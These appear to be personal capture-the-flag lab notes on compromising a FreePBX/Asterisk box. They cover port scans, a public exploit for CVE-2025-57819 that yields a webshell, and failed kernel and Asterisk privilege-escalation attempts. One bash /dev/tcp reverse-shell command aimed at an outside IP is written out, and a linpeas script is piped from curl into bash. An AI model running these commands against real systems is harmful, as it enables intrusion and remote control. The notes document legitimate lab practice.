---
tags:
banner:
publish: false
---
TCP scan
```bash
nmap -p- -sV -sC connected.htb
```

# Box info
ports:
- 22/tpc - SSH OpenSSH 7.4
- 80/tcp - Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
- 443/tcp same as 80


# Website - FreePBX
- Version: 16.0.40.7 (CVE-2025-57819)
- Robots.txt disallows / (real)

There is an User Control Panel and Operator Panel that both lead to their own login page (takes a loong while to load and eventually times out on the operator panel).


## CVE-2025-57819
[NIST says that](https://nvd.nist.gov/vuln/detail/cve-2025-57819) FreePBX 15, 16 and 17 are vulnerable because user inputs arent sufficiently sanitized and allows for unauthenticated access to to FreePBX admin and database manipulation. *not patched in this version*.

There is an exploit available on [github](https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819).

This lead to code execution trough the url bar (webshell), using an url encoded revshell, i was able to gain access to the server.

# Server
user flag found.

sudo doesnt seem to work since it think there is no tty present/. Shell stabilisation worked: `python -c ‘import pty;pty.spawn(“/bin/bash”)’`. Sudo is enabled.

inside the aterisk home folder tehre is a file caleld .asterisk_history with the content `_HiStOrY_V2_`.

looking in the server files, starting in the admin folder.

after googling how to reset freepbx password from console, i found the command `fwconsole unlock xxx` and replace xxx with the account id displayed on the main page of the website by hitting ctrl a

fetching kernel version using `uname -r`: `5.4.239-1.el7.elrepo.x86_64`. What a weird kernel name. 
Found [this](https://nsfocusglobal.com/linux-kernel-privilege-escalation-vulnerability-cve-2024-1086-notice/) related article talking about [CVE-2024-1086](https://nvd.nist.gov/vuln/detail/CVE-2024-1086), which is a [use-after-free](https://encyclopedia.kaspersky.com/glossary/use-after-free/) vulnerability.

![[Vault-data/Attachments/12 Connected - Easy box.png]] 
Why is the url purple already. Trying [this exploit from github](https://github.com/Notselwyn/CVE-2024-1086). Doesn’t seem to work on this machine.

Some more enumeration:
- `env` and `set` output a whole lot of environment variables, but i don’t exactly know what to do with those. `set` has a handful of values that seems very interesting though. 
	- `_xspecs` has a huge regex?
	- \_\_dahdi\_anything seems to have a bunch of code snippets.
- `whoami` says i am asterisk, the user.
- `ps aux` shows a bunch of services running under root. Cannot find anything noteworthy
	- There are also some other users: \_laurel, libstor+, polkitd, and *avahi*. Asterisk is also in there for `/usr/sbin/asterisk` and some http and bash services. some of which prolly being my revshells and stuck shells on trying the previously mentioned exploits.
	- [avahi](<https://en.wikipedia.org/wiki/Avahi_(software)>) seems to be some kind of zero-configuration networking applications. It will make services discover-able on the LAN.
	- [Asterisk](https://wiki.archlinux.org/title/Asterisk) is a PBX (private branch exchange, call center stuff) that does things like voip.
- `ps -elf` doesnt really work because the text cuts off before i can read it.
- `top` doesnt work because the TERM env var isnt set.
- `ss -tulpn` shows some services running
	- all tcp ports are running on localhost, except for 22 and 25 (smtp).
	- udp ports have some publicly exposed ports
		- 4569 - “asterisk”
		- 60000 - “pnp_server”
		- 5060 - “asterisk”
		- 54388 - “asterisk”
		- 123
		- 5413
	- running `nmap -p 4569,60000,5060,54388,123,5413 -sU` yields:
		- 4569 - [iax](https://en.wikipedia.org/wiki/Inter-Asterisk_eXchange)
			- Inter-Asterisk eXchange. A deprecated protocol used for switching calls it seems
		- 5060 - [sip](https://en.wikipedia.org/wiki/Session_Initiation_Protocol)
			- Session Initiation Protocol
		- 54388 - unknown
		- 60000 - unknown
		- 123 - ntp
			- time sync via internet
		- 5413 - wwiotalk
			- real time data comms service
	- running `nmap -p 4569,5060,123,5413 -sU -sV -sC` yields nothing more.
- `asterisk -r` connects me to the asterisk cli.
	- version 20.17.0

## Asterisk
Googling asterisk privilege escalation. lands me on [CVE-2026-23741](https://nvd.nist.gov/vuln/detail/CVE-2026-23741). This version *should* be vulnerable. The CVE says a part of asterisk runs as root, which sources contents of `/etc/asterisk/ast_debug_tools.conf`, I can write in this folder. Editing this config file should let me run bash code since it supports that semantic.

i wrote `/bin/bash` to the file `ast_debug_tools.conf`. now lets see how i can make it run that files. I need to somehow trigger a crash, or at least make the core dumper run.

i wrote `/bin/bash` to a file that i know will start (because it says it doesn’t exist during asterisk startup). Asterisk says it cannot parse the file, gotta try something else.

Googling a bit and the way to run bash code should be `exten => h,1,system(python -c 'import pty;pty.spawn("/bin/bash")')`. 
```bash
echo "/bin/bash -i >& /dev/tcp/10.10.14.71/5557 0>&1" > ast_debug_tools.conf
```

Verifying that it outputted by running:
```bash
cat ast_debug_tools.conf
```

triggering the conf with 
```bash
/var/lib/asterisk/scripts/ast_coredumper
```

This works. But it needs to be ran as root, not when i run it.

trying to manually crash the app by running:
```bash
kill -SEGV $(pidof asterisk)
```

Doesnt work. I can’t seem to get the app to crash or trigger the core dumper

Im going to try some other approach. Back to enumerating.

copied lineas onto the box by doing `python3 -m http.server` and then `curl -L ip:8000/linpeas.sh | bash`. I don’t really see anything noteworthy. Going to take another look at services and asterisk by hand.

`ps aux | grep asterix`
safe_asterisk is running as root. This means that any config file should also run as root? Since it restarts as root. Let me try to just plop the code from previous in some other config folder. Doesn’t work.

`ps aux | grep root`. Apart from seeing some python scripts, i dont really see anything that could be exploitable.

asterisk mostly runs httpd instances. But root also runs one. hmmm…
![[Vault-data/Attachments/12 Connected - Easy box-1.png]]

## Httpd
Apache server version 2.4.6
httpd seems to be the http daemon used by apache. It is also a [terminal command](https://httpd.apache.org/docs/current/programs/httpd.html).

Looking for the httpd folder using `find / -name 'httpd.conf'`: `/etc/httpd`. Found the config file at `conf/httpd.conf`. Sifting trough it.
- Every user is switched to asterisk. A rule is set for it.
- ServerAdmin root@sangoma.localhost

Nothing really noteworthy.


Trying the trick of setting the user id of a python script to root also does not work.

Going to check and see if i can find some misconfiguration inside of asterisk.
## Asterisk part 2
[This reddit post](https://www.reddit.com/r/Asterisk/comments/1f4wwf3/common_security_misconfigurations_in_asterisk/) asks about some common security misconfigurations. Top comment and the post itself says that SIP should be closed off from the internet. Which is port 5060. From my previous scans, i saw that it is open to the internet. Let me check it out.

Looking at [this guide](https://hacktricks.wiki/en/network-services-pentesting/pentesting-voip/basic-voip-protocols/sip-session-initiation-protocol.html). Or well, skimming it.

nmap has a sip methods script you can run.
```bash
nmap -sU -p 5060 --script sip-methods connected.htb
```

Nothing noteworthy. SIP is a dead end i think. I don’t think i have to set up an entire call thingie to access it.

Maybe fwconsole will have something noteworthy